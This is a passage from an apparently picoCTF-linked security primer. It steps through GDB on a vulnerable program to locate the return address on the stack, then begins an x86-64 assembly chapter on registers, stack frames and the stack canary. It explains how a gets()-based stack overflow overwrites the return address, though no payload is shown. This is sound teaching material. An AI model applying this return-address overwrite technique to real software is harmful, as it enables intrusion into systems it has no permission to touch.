                            <div class="listingblock">
                                <div class="content">
                                    <pre
                                        class="pygments highlight"><code data-lang="text"><span></span>(gdb) b main</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>And run the program again using "r"</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre
                                        class="pygments highlight"><code data-lang="text"><span></span>(gdb) r</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>The program being debugged has been started already.</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre class="pygments highlight"><code data-lang="text"><span></span>Start it from the beginning? (y or n) y
Starting program: /vuln1
Breakpoint 2, 0x0000000000400611 in main ()
(gdb)</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>To show the assembly of the current function in where we are, which is "main", use
                                    "disas":</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre class="pygments highlight"><code data-lang="text"><span></span>(gdb) disas
    Dump of assembler code for function main:
    0x000000000040060d &lt;+0&gt;: push %rbp
    0x000000000040060e &lt;+1&gt;: mov %rsp,%rbp
 =&gt; 0x0000000000400611 &lt;+4&gt;: sub $0x10,%rsp
    0x0000000000400615 &lt;+8&gt;: mov %edi,-0x4(%rbp)
    0x0000000000400618 &lt;+11&gt;: mov %rsi,-0x10(%rbp)
    0x000000000040061c &lt;+15&gt;: mov $0x0,%eax
    0x0000000000400621 &lt;+20&gt;: callq 0x4005ca &lt;vuln&gt;
    0x0000000000400626 &lt;+25&gt;: mov $0x0,%eax
    0x000000000040062b &lt;+30&gt;: leaveq
    0x000000000040062c &lt;+31&gt;: retq
End of assembler dump.</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>Even if you dont know assembly, if you look through it, you might guess that "callq
                                    0x4005ca &lt;vuln&gt;" is the function call to "vuln". We will go to that
                                    instruction in the debugger. To advance one instruction in GDB we can use "si". Try
                                    it, and use "disas" again to see where we are now. You should see something like
                                    this:</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre class="pygments highlight"><code data-lang="text"><span></span>(gdb) si
    0x0000000000400615 in main ()
    (gdb) disas
    Dump of assembler code for function main:
    0x000000000040060d &lt;+0&gt;: push %rbp
    0x000000000040060e &lt;+1&gt;: mov %rsp,%rbp
    0x0000000000400611 &lt;+4&gt;: sub $0x10,%rsp
 =&gt; 0x0000000000400615 &lt;+8&gt;: mov %edi,-0x4(%rbp)
    0x0000000000400618 &lt;+11&gt;: mov %rsi,-0x10(%rbp)
    0x000000000040061c &lt;+15&gt;: mov $0x0,%eax
    0x0000000000400621 &lt;+20&gt;: callq 0x4005ca &lt;vuln&gt;
    0x0000000000400626 &lt;+25&gt;: mov $0x0,%eax
    0x000000000040062b &lt;+30&gt;: leaveq
    0x000000000040062c &lt;+31&gt;: retq
    End of assembler</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>We could use "si" three times more to get to the instruction in which the function
                                    call is made. But this strategy might not be good if we are far away from the
                                    function call. Instead, we can set a breakpoint on the memory address of the
                                    function call that we see is "0x0000000000400621". To set a breakpoint on a memory
                                    address, we also use "b", but we put an asterisk previous to the address like this
                                    "b *0x0000000000400621", after pressing enter you should see something like:</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre class="pygments highlight"><code data-lang="text"><span></span>(gdb) b *0x0000000000400621
Breakpoint 3 at 0x400621
(gdb)</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>Now, use "continue" or "c" to continue to the breakpoint:</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre class="pygments highlight"><code data-lang="text"><span></span>(gdb) c
Continuing.
Breakpoint 3, 0x0000000000400621 in main ()
(gdb)</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>Now, verify that we actually get to where we wanted using "disas":</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre class="pygments highlight"><code data-lang="text"><span></span>(gdb) disas
    Dump of assembler code for function main:
    0x000000000040060d &lt;+0&gt;: push %rbp
    0x000000000040060e &lt;+1&gt;: mov %rsp,%rbp
    0x0000000000400611 &lt;+4&gt;: sub $0x10,%rsp
    0x0000000000400615 &lt;+8&gt;: mov %edi,-0x4(%rbp)
    0x0000000000400618 &lt;+11&gt;: mov %rsi,-0x10(%rbp)
    0x000000000040061c &lt;+15&gt;: mov $0x0,%eax
 =&gt; 0x0000000000400621 &lt;+20&gt;: callq 0x4005ca &lt;vuln&gt;
    0x0000000000400626 &lt;+25&gt;: mov $0x0,%eax
    0x000000000040062b &lt;+30&gt;: leaveq
    0x000000000040062c &lt;+31&gt;: retq
    End of assembler dump.
    (gdb)</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>At this point, the program is about to execute the function call to "vuln()".
                                    Remember that the return address is the next instruction to the function call. Note
                                    that If it was the same as the function call, it would return and call the function
                                    again and get into an infinite loop</p>
                            </div>
                            <div class="paragraph">
                                <p>In this case, the return address is "0x0000000000400626", remember this address. If
                                    we check the Stack Pointer (SP) right now using "x $rsp" we would see that it points
                                    to an address that does not contain the return address yet:</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre class="pygments highlight"><code data-lang="text"><span></span>(gdb) x $rsp
0x7fffffffe010: 0xffffe108</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>If we advance one instruction using "si", we would suddenly be in the first
                                    instruction of the function "vuln()":</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre class="pygments highlight"><code data-lang="text"><span></span>(gdb) si
0x00000000004005ca in vuln ()
(gdb) disas
Dump of assembler code for function vuln:
=&gt;  0x00000000004005ca &lt;+0&gt;: push %rbp
    0x00000000004005cb &lt;+1&gt;: mov %rsp,%rbp
    0x00000000004005ce &lt;+4&gt;: add $0xffffffffffffff80,%rsp
    0x00000000004005d2 &lt;+8&gt;: lea 0x127(%rip),%rdi # 0x400700
    0x00000000004005d9 &lt;+15&gt;: callq 0x4004a0 &lt;puts@plt&gt;
    0x00000000004005de &lt;+20&gt;: lea -0x80(%rbp),%rax
    0x00000000004005e2 &lt;+24&gt;: mov %rax,%rdi
    0x00000000004005e5 &lt;+27&gt;: mov $0x0,%eax
    0x00000000004005ea &lt;+32&gt;: callq 0x4004b0 &lt;gets@plt&gt;
    0x00000000004005ef &lt;+37&gt;: lea -0x80(%rbp),%rax
    0x00000000004005f3 &lt;+41&gt;: mov %rax,%rdi
    0x00000000004005f6 &lt;+44&gt;: callq 0x4004a0 &lt;puts@plt&gt;
    0x00000000004005fb &lt;+49&gt;: mov 0x200a3e(%rip),%rax
    0x0000000000400602 &lt;+56&gt;: mov %rax,%rdi
    0x0000000000400605 &lt;+59&gt;: callq 0x4004c0 &lt;fflush@plt&gt;
    0x000000000040060a &lt;+64&gt;: nop
    0x000000000040060b &lt;+65&gt;: leaveq
    0x000000000040060c &lt;+66&gt;: retq
    End of</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>And if we check the SP again:</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre class="pygments highlight"><code data-lang="text"><span></span>(gdb) x $rsp
0x7fffffffe008: 0x00400626
(gdb)</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>Do you remember the return address was "0x0000000000400626"? We can see that the SP
                                    points to the address "0x7fffffffe008", and that address contains the return
                                    address!</p>
                            </div>
                            <div class="paragraph">
                                <p>The whole idea of the attack, is to modify the return address, to return at another
                                    place. In our attack example at the beginning, we modify it so it returned to the
                                    function "win()".</p>
                            </div>
                            <div class="paragraph">
                                <p>The function gets() in C, simply copies any user input and puts all that in memory,
                                    so we simply need to overwrite the return address. As a programmer, never use gets()
                                    in C, you would introduce a vulnerability in your program that is very easy to
                                    exploit!</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="sect1">
            <h2 id="_assembly">11. Assembly</h2>
            <div class="sectionbody">
                <h5 id="_samuel_sabogal_pardo_8" class="discrete">Samuel Sabogal Pardo</h5>
                <div class="paragraph">
                    <p></p>
                </div>
                <hr>
                <div class="paragraph">
                    <p>We previously saw in binary exploitation how some registers work and how the memory of a program
                        is allocated. Once you get some idea of how to do basic binary exploits, to enter in a more
                        advance level it is useful to understand the assembly in more detail. There are several assembly
                        languages and they are exclusive to the processor architecture of a computer. Processor
                        architectures have specific instructions. For example, an Intel processor can execute different
                        instruction than an ARM processor, hence, the assembly language for ARM is different than the
                        one for Intel. To begin, we will be using Intel assembly just for the fact that Intel
                        architecture is widely used. The webshell, and your computer probably, have an Intel
                        architecture. Note that the AMD processors have the same architecture and instruction set as
                        Intel. Smartphones, in contrast to most laptops or desktops computers, generally have an ARM
                        processor.</p>
                </div>
                <div class="paragraph">
                    <p>Intel is CISC (Complex Instruction Set Computer); that implies that it has much more instructions
                        than ARM which is RISC (Reduced Set Instruction Computer). However, we will only be exploring
                        some instruction in intel that are common and useful to know. It would be too dense to begin to
                        explain instructions independently. Instead, lets make a program and begin to understand it.
                        Assembly is not easy to abstract at the beginning, but once you learn a few things, it becomes
                        very intuitive and it is possible to read assembly to understand the logic of a program in an
                        architecture you never saw before because it has similar patterns. Therefore, we encourage you
                        to keep trying on this part even if it seems not easy to grasp at the beginning.</p>
                </div>
                <div class="paragraph">
                    <p><strong>Outside Resource</strong>:
                        <a
                            href="https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Arch1001_x86-64_Asm+2021_v1/about">OpenSecurity
                            x86-64 Training</a> is an excellent free course on Intel assembly.
                    </p>
                </div>
                <div class="sect2">
                    <h3 id="_registers">11.1. Registers</h3>
                    <div class="paragraph">
                        <p>We will show in this part, for reference, the most relevant registers from Intel Architecture
                            for an example of a program in assembly we will introduce. The Intel registers are broken
                            down in several categories. They include General Registers, Segment Registers, Index/Pointer
                            Registers, and Flags registers. For now, it is good to see the purpose of each of the
                            registers in two of those categories.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_general_registers">11.2. General Registers</h3>
                    <div class="paragraph">
                        <p>Note that in the General Registers, when we are using processor of 64 bits, the register name
                            begins with R. In a 32 bits processor, the register name begins with E, and in 16-bit
                            architecture, it does not have a prefix and the name is only two letters. For example, there
                            is a 16-bit register called AX. In 32 bits, we have the same register for the same purpose,
                            but it can hold 32 bits, and it is called EAX. In 64 bits, that same register is called RAX.
                            We can use a 16-bit or 32-bit register in a 64-bit architecture, but not the other way
                            around. Each register is conventionally used for some specific operations, but they can be
                            used for other purposes. These are the General Registers in 16, 32, 64 bits:
                            RAX,EAX,AX (Accumulator register): It is usually used to place the return value of a
                            function but can be used for other purposes.</p>
                    </div>
                    <div class="paragraph">
                        <p>RBX,EBX,BX (Base register): Used as the base pointer for memory access. We subtract or add an
                            offset to the value of this register to access variables.</p>
                    </div>
                    <div class="paragraph">
                        <p>RCX,ECX,CX (Counter register): Usually used as a loop counter.</p>
                    </div>
                    <div class="paragraph">
                        <p>RDX,EDX,DX (Data register): Usually used to store temporary data in operations.</p>
                    </div>
                    <div class="paragraph">
                        <p>Note that in a 64 bits program, the conventions can change. For example, in a 32-bit
                            architecture we generally pass the arguments of a function in the stack, while in 64-bit
                            programs we pass them in registers in many cases. For now, do not worry about those details.
                            Focus on getting a sense on how assembly works when we show the example of a program in
                            assembly.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_indexpointer_registers">11.3. Index/Pointer Registers</h3>
                    <div class="paragraph">
                        <p>These registers are used to mark the end or start of a region of memory to allow a program
                            keeping track of elements such as location of variables or the top of the stack, which are
                            essential to manipulate data in memory.</p>
                    </div>
                    <div class="paragraph">
                        <p>RSP,ESP,SP (Stack pointer register): Indicates the top of the stack. Whenever we create a
                            local variable, this pointer changes to allow space to that variable. For example, if we
                            create an variable that takes 4 bytes, the stack pointer moves 4 bytes to make room for that
                            new variable.</p>
                    </div>
                    <div class="paragraph">
                        <p>RIP,EIP,IP (Instruction Pointer): Indicates the current instruction that the program is
                            executing. If we make this register pointing to an address, the program will execute the
                            code at that address.</p>
                    </div>
                    <div class="paragraph">
                        <p>RBP,EBP,BP (Base pointer register): Indicates the beginning of the stack frame of a function.
                            The stack frame is a region of memory in which we place data, such as local variables, from
                            a specific function. To access a local variable from a function, we take the address of the
                            base pointer and subtract an offset.</p>
                    </div>
                    <div class="paragraph">
                        <p>RDI,EDI,DI (Destination index register): Generally used for copying chunks of memory, that
                            can be strings or arrays.</p>
                    </div>
                    <div class="paragraph">
                        <p>RSI,ESI,SI (Source index register): Similar purpose to the previous register (Destination
                            index register).</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_assembly_example">11.4. Assembly example</h3>
                    <div class="paragraph">
                        <p>Now, lets dive into the assembly of a program!</p>
                    </div>
                    <div class="paragraph">
                        <p>Go to the picoCTF webshell:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://webshell.picoctf.org/" class="bare">https://webshell.picoctf.org/</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Compile the following program:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="c"><span></span><span class="tok-cp">#include</span><span class="tok-w"> </span><span class="tok-cpf">&lt;stdio.h&gt;</span>
<span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-nf">main</span><span class="tok-p">(</span><span class="tok-w"> </span><span class="tok-p">)</span><span class="tok-w"> </span><span class="tok-p">{</span>
<span class="tok-w">   </span><span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-n">i</span><span class="tok-p">;</span>
<span class="tok-w">   </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-w"> </span><span class="tok-s">&quot;Enter a value :&quot;</span><span class="tok-p">);</span>
<span class="tok-w">   </span><span class="tok-n">scanf</span><span class="tok-p">(</span><span class="tok-s">&quot;%d&quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">&amp;</span><span class="tok-n">i</span><span class="tok-p">);</span>
<span class="tok-w">   </span><span class="tok-k">if</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-o">&gt;</span><span class="tok-mi">5</span><span class="tok-p">){</span>
<span class="tok-w">       </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;Greater than 5&quot;</span><span class="tok-p">);</span>
<span class="tok-w">   </span><span class="tok-p">}</span><span class="tok-k">else</span><span class="tok-w"> </span><span class="tok-p">{</span>
<span class="tok-w">       </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;Less or equal than 5&quot;</span><span class="tok-p">);</span>
<span class="tok-w">   </span><span class="tok-p">}</span>
<span class="tok-w">   </span><span class="tok-k">return</span><span class="tok-w"> </span><span class="tok-mi">0</span><span class="tok-p">;</span>
<span class="tok-p">}</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>To do that you can create a file with:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>nano example.c</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Paste the code in that file, save it with control+x, and then compile the file with:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>gcc example.c -o example</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Run it to verify its functionality with:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span> ./example</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You can obtain the assembly of a compiled program without having the original source code
                            with the following command:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>objdump --disassemble example</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>That will output the assembly of the compiled program example on the terminal. You can
                            redirect that output to a file, which in this case we call dump.txt, using:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>objdump --disassemble example &gt; dump.txt</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>That assembly dump has many things. For now, we will focus only on the assembly of the
                            function main. We can dump the assembly of a specific function, in this case main, in
                            the following manner:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>gdb -batch -ex &#39;file example &#39; -ex &#39;disassemble main&#39;</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Also, you can run the program on GDB like this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>gdb example</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Set a break point on main:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>(gdb) b main
Breakpoint 1 at 0x71e</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>And run the program:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>(gdb) r
Starting program: /home/your_user/example
Breakpoint 1, 0x000055555555471e in main ()Breakpoint 1, 0x0000555555555189 in main ()</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Since the program execution stopped at main, you can do disas to obtain the assembly from
                            main:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>(gdb) disas
Dump of assembler code for function main:
   0x000055555555471a &lt;+0&gt;:	push   %rbp
   0x000055555555471b &lt;+1&gt;:	mov    %rsp,%rbp
=&gt; 0x000055555555471e &lt;+4&gt;:	sub    $0x10,%rsp
   0x0000555555554722 &lt;+8&gt;:	mov    %fs:0x28,%rax
   0x000055555555472b &lt;+17&gt;:	mov    %rax,-0x8(%rbp)
   0x000055555555472f &lt;+21&gt;:	xor    %eax,%eax
   0x0000555555554731 &lt;+23&gt;:	lea    0xfc(%rip),%rdi        # 0x555555554834
   0x0000555555554738 &lt;+30&gt;:	mov    $0x0,%eax
   0x000055555555473d &lt;+35&gt;:	callq  0x5555555545e0 &lt;printf@plt&gt;
   0x0000555555554742 &lt;+40&gt;:	lea    -0xc(%rbp),%rax
   0x0000555555554746 &lt;+44&gt;:	mov    %rax,%rsi
   0x0000555555554749 &lt;+47&gt;:	lea    0xf4(%rip),%rdi        # 0x555555554844
   0x0000555555554750 &lt;+54&gt;:	mov    $0x0,%eax
   0x0000555555554755 &lt;+59&gt;:	callq  0x5555555545f0 &lt;__isoc99_scanf@plt&gt;
   0x000055555555475a &lt;+64&gt;:	mov    -0xc(%rbp),%eax
   0x000055555555475d &lt;+67&gt;:	cmp    $0x5,%eax
   0x0000555555554760 &lt;+70&gt;:	jle    0x555555554775 &lt;main+91&gt;
   0x0000555555554762 &lt;+72&gt;:	lea    0xde(%rip),%rdi        # 0x555555554847
   0x0000555555554769 &lt;+79&gt;:	mov    $0x0,%eax
   0x000055555555476e &lt;+84&gt;:	callq  0x5555555545e0 &lt;printf@plt&gt;
   0x0000555555554773 &lt;+89&gt;:	jmp    0x555555554786 &lt;main+108&gt;
   0x0000555555554775 &lt;+91&gt;:	lea    0xda(%rip),%rdi        # 0x555555554856
   0x000055555555477c &lt;+98&gt;:	mov    $0x0,%eax
   0x0000555555554781 &lt;+103&gt;:	callq  0x5555555545e0 &lt;printf@plt&gt;
   0x0000555555554786 &lt;+108&gt;:	mov    $0x0,%eax
   0x000055555555478b &lt;+113&gt;:	mov    -0x8(%rbp),%rdx
   0x000055555555478f &lt;+117&gt;:	xor    %fs:0x28,%rdx
   0x0000555555554798 &lt;+126&gt;:	je     0x55555555479f &lt;main+133&gt;
   0x000055555555479a &lt;+128&gt;:	callq  0x5555555545d0 &lt;__stack_chk_fail@plt&gt;
   0x000055555555479f &lt;+133&gt;:	leaveq
   0x00005555555547a0 &lt;+134&gt;:	retq
End of assembler dump.</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Note that the instructions on an Intel processor can be represented with two types of syntax.
                            There is the AT&amp;T syntax, which is the one we just printed, and there is the Intel
                            syntax. Note that the syntax is different from architecture of the processor. Here we are on
                            the same processor, which is Intel architecture, but we can use AT&amp;T syntax or Intel
                            syntax. To print intel syntax on GDB, we can do:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>(gdb) set disassembly-flavor intel</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>If you run disas again, you will see the same main function, but in Intel syntax:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>(gdb) disas
Dump of assembler code for function main:
   0x000055555555471a &lt;+0&gt;:	    push   rbp
   0x000055555555471b &lt;+1&gt;:	    mov    rbp,rsp
=&gt; 0x000055555555471e &lt;+4&gt;:	    sub    rsp,0x10
   0x0000555555554722 &lt;+8&gt;:	    mov    rax,QWORD PTR fs:0x28
   0x000055555555472b &lt;+17&gt;:	mov    QWORD PTR [rbp-0x8],rax
   0x000055555555472f &lt;+21&gt;:	xor    eax,eax
   0x0000555555554731 &lt;+23&gt;:	lea    rdi,[rip+0xfc]        # 0x555555554834
   0x0000555555554738 &lt;+30&gt;:	mov    eax,0x0
   0x000055555555473d &lt;+35&gt;:	call   0x5555555545e0 &lt;printf@plt&gt;
   0x0000555555554742 &lt;+40&gt;:	lea    rax,[rbp-0xc]
   0x0000555555554746 &lt;+44&gt;:	mov    rsi,rax
   0x0000555555554749 &lt;+47&gt;:	lea    rdi,[rip+0xf4]        # 0x555555554844
   0x0000555555554750 &lt;+54&gt;:	mov    eax,0x0
   0x0000555555554755 &lt;+59&gt;:	call   0x5555555545f0 &lt;__isoc99_scanf@plt&gt;
   0x000055555555475a &lt;+64&gt;:	mov    eax,DWORD PTR [rbp-0xc]
   0x000055555555475d &lt;+67&gt;:	cmp    eax,0x5
   0x0000555555554760 &lt;+70&gt;:	jle    0x555555554775 &lt;main+91&gt;
   0x0000555555554762 &lt;+72&gt;:	lea    rdi,[rip+0xde]        # 0x555555554847
   0x0000555555554769 &lt;+79&gt;:	mov    eax,0x0
   0x000055555555476e &lt;+84&gt;:	call   0x5555555545e0 &lt;printf@plt&gt;
   0x0000555555554773 &lt;+89&gt;:	jmp    0x555555554786 &lt;main+108&gt;
   0x0000555555554775 &lt;+91&gt;:	lea    rdi,[rip+0xda]        # 0x555555554856
   0x000055555555477c &lt;+98&gt;:	mov    eax,0x0
   0x0000555555554781 &lt;+103&gt;:	call   0x5555555545e0 &lt;printf@plt&gt;
   0x0000555555554786 &lt;+108&gt;:	mov    eax,0x0
   0x000055555555478b &lt;+113&gt;:	mov    rdx,QWORD PTR [rbp-0x8]
   0x000055555555478f &lt;+117&gt;:	xor    rdx,QWORD PTR fs:0x28
   0x0000555555554798 &lt;+126&gt;:	je     0x55555555479f &lt;main+133&gt;
   0x000055555555479a &lt;+128&gt;:	call   0x5555555545d0 &lt;__stack_chk_fail@plt&gt;
   0x000055555555479f &lt;+133&gt;:	leave
   0x00005555555547a0 &lt;+134&gt;:	ret
End of assembler dump.</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>In AT&amp;T syntax, there are several differences. One of them that is notorious, is that you
                            see the symbol % all around, which is used to prefix registers. Also, in some operations the
                            position of arguments is different. Keep in mind this to prevent confusion. We will explain
                            the program using Intel syntax, following each line of the assembly code. Remember from the
                            binary exploitation section, that the hexadecimal number we observe at the left, for example
                            this 0x000055555555471a &lt;+0&gt;:, is the memory address in which that instruction of
                            assembly is located on RAM. In the first line of assembly we see in the main function is the
                            following (we removed the address shown at the left for simplicity):</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>push   rbp</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We observe the instruction push rbp. As we know already, rbp is the base pointer, which is
                            a register used to keep track of the part of the stack in which the local variables of a
                            function begin to be stored. In this case, the current value of the rbp is pushed into the
                            stack, to be able to recover it later. This is an important part of a function that allow us
                            to keep the value of the base pointer from the previous function. For example, suppose you
                            have a function call inside another function, like in the following example in which we call
                            func2 from func1:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="c"><span></span><span class="tok-kt">void</span><span class="tok-w"> </span><span class="tok-nf">func2</span><span class="tok-p">(){</span>
<span class="tok-w">	</span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-n">var4</span><span class="tok-p">;</span>
<span class="tok-w">	</span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-n">var5</span><span class="tok-p">;</span>
<span class="tok-w">	</span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-n">var6</span><span class="tok-p">;</span>
<span class="tok-p">}</span>
<span class="tok-kt">void</span><span class="tok-w"> </span><span class="tok-nf">func1</span><span class="tok-p">(){</span>
<span class="tok-w">	</span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-n">var1</span><span class="tok-p">;</span>
<span class="tok-w">	</span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-n">var2</span><span class="tok-p">;</span>
<span class="tok-w">	</span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-n">var3</span><span class="tok-p">;</span>
<span class="tok-w">	</span><span class="tok-n">func2</span><span class="tok-p">();</span>
<span class="tok-p">}</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>The piece of memory in which are stored the variables of a function is called the stack
                            frame. In assembly we do not have variable names, instead, we have the rbp pointing to the
                            memory address in which begins the stack frame of a function. For example, if the program is
                            currently executing func2, the three variables declared in func2, could look like the
                            following in memory:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/9image1.png" alt="9image1">
                        </div>
                        <div class="title">Figure 61. Stack frame of func2</div>
                    </div>
                    <div class="paragraph">
                        <p>If we want to access the value of var6, we do rbp minus 3. Note that if we subtract three
                            positions from rbp, we would be pointing to var6. As you can see, accessing variables in
                            assembly is not complicated, we just need to subtract from rbp some positions to point to
                            the variable we want. However, we just have one register in the processor to keep the value
                            of the base pointer. So, what we do, is pushing into memory the value of the base pointer
                            from the previous function. That is the rbp func1 that you see in the memory from the
                            previous image. We store the rbp from a previous function, as we store a local variable, to
                            be able to recover it later when we come back to func1 and be able to access the variable
                            from func1. We explained all that to point out what was this line for:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>push   rbp</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>In that line of assembly, we are storing the previous value of the rbp, to later restore it
                            when we return from the current function. The instruction push, places the value of a
                            registry into memory, and subtracts the size of the register to the stack pointer. In an
                            Intel processor of 64 bits, a register is 8 bytes. So, when we do push rbp, it is
                            automatically subtracted 8 to the stack pointer.</p>
                    </div>
                    <div class="paragraph">
                        <p>In the second line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>0x000055555555471b &lt;+1&gt;:	mov    rbp,rsp</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We assign the stack pointer value to the base pointer. Mov, in Intel syntax, assigns the
                            value of the operand at the right side to the operand at the left side. In this case, rsp
                            (stack pointer), is the operand at the right side, and rbp (base pointer) is the operand at
                            the left.
                            Such an assignment is done, because at the beginning of a function the stack pointer is
                            pointing to the beginning of the stack frame. When push variables in a function, the stack
                            pointer will move, because the stack pointer will be pointing always to the last variable
                            pushed. Then, in the line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>sub    rsp,0x10</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We are subtracting 16 bytes from the stack pointer. Note that the prefix 0x is used to
                            denote a hexadecimal number. 10 in hexadecimal is 16 in decimal. In Intel syntax, the
                            instructions sub subtracts the operand at the right side to the operand on the left side.
                            In this case, we subtract 10 from rsp. That subtraction is done to allocate 16 bytes on the
                            stack. We will assign values in those bytes later. So far, we have something like the
                            following, in which we have 16 bytes allocated:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/9image2.png" alt="image" width="198" height="222">
                        </div>
                        <div class="title">Figure 62. 16 bytes of memory allocated with the rbp pointing at the base and
                            rsp at top</div>
                    </div>
                    <div class="paragraph">
                        <p>Then in this line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>mov    rax,QWORD PTR fs:0x28</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We are assigning FS:0x28 to the register rax. QWORD PTR, means that is a pointer to a QWORD.
                            A QWORD simply means a variable of 8 bytes. FS:0x28 contains something called the stack
                            canary, which is a random value used to mitigate the risk of buffer overflow attacks. If
                            that value is overwritten, the program will detect an attack or error and terminate. Then in
                            this line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>mov    QWORD PTR [rbp-0x8], rax</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We are assigning the value of rax, which currently has the stack canary, to rbp-0x8. Note
                            that rbp-0x8 is located in the memory chunk of 16 bytes we previously allocated. So, we are
                            placing the stack canary in the first part of the stack frame of the main function. In the
                            following image the stack canary is colored in yellow:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/9image3.png" alt="image" width="198" height="222">
                        </div>
